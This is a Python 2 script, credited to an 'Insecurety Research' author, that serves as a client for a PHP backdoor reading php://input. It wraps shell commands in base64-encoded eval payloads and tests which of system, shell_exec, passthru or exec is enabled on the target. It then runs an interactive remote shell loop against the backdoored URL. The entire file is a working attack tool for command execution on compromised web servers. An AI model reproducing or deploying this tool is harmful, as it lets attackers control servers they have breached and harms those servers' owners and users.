#!/usr/bin/python
# Client for the php://input based backdoor
# Website: insecurety.net
# Author: infodox
# Twatter: @info_dox
# Insecurety Research - 2013
# version: 0.2a

import requests
import sys

if (len(sys.argv) != 2):
    print "Usage: " + sys.argv[0] + " <url of backdoor>"
    print "Example: " + sys.argv[0] + " http://localhost/odd.php"
    sys.exit(0)
    
url = sys.argv[1]
tester = """echo w00tw00tw00t"""
testkey = """w00tw00tw00t"""
print "\n[+] URL in use: %s \n" %(url)

###                      ###
# Whole Bunch of Functions #
###                      ###
def genphp(func, cmd):
    if func == "system":
        rawphp = """system('%s');""" %(cmd)
    elif func == "shellexec":
        rawphp = """echo shell_exec('%s');""" %(cmd)
    elif func == "passthru":
        rawphp = """passthru('%s');""" %(cmd)
    elif func == "exec":
        rawphp = """echo exec('%s');""" %(cmd)
    encodedphp = rawphp.encode('base64')
    payload = """<?php eval(base64_decode('%s')); ?>""" %(encodedphp)
    return payload

def test(url, tester, testkey): # This whole function is ugly as sin
    print "[+] Testing system()" # I need to make it tighter
    payload = genphp('system', tester) # No, really. Look at the waste
    r = requests.post(url, payload) # It could be TIIINY and fast!
    if testkey in r.text:
        print "[+] system() works, using system."
        func = 'system'
        return func
    else:
        print "[-] system() seems disabled :("
        pass
    print "[+] Testing shell_exec()" # LOOK AT THE FORKING CODE REUSE
    payload = genphp('shellexec', tester) # THIS COULD BE TINY
    r = requests.post(url, payload)  # But. Coffee is lacking
    if testkey in r.text:
        print "[+] shell_exec() works, using shell_exec"
        func = 'shellexec'
        return func
    else:
        print "[-] shell_exec() seems disabled :("
        pass
    print "[+] Testing passthru()"
    payload = genphp('passthru', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] passthru() works, using passthru"
        func = 'passthru'
        return func
    else:
        print "[-] passthru() seems disabled :("
        pass
    print "[+] Testing exec()"
    payload = genphp('exec', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] exec() works, using exec"
        func = 'exec'
        return func
    else:
        print "[-] exec() seems disabled :("
        pass

###                                        ###
# End of functions and object oriented stuff #
###                                        ###

# the main body
func = test(url, tester, testkey)
while True:
    try:
        cmd = raw_input("shell:~$ ")
        if cmd == "quit":
            print "\n[-] Quitting"
            sys.exit(0)
        elif cmd == "exit":
            print "\n[-] Quitting"
            sys.exit(0)
        else:
            try:
                payload = genphp(func, cmd)
                hax = requests.post(url, payload)
                print hax.text
            except Exception or KeyboardInterrupt:
                print "[-] Exception Caught, I hope"
                sys.exit(0)
    except Exception or KeyboardInterrupt:
        print "[-] Exception or CTRL+C Caught, I hope"
        print "[-] Exiting (hopefully) cleanly..."
        sys.exit(0)
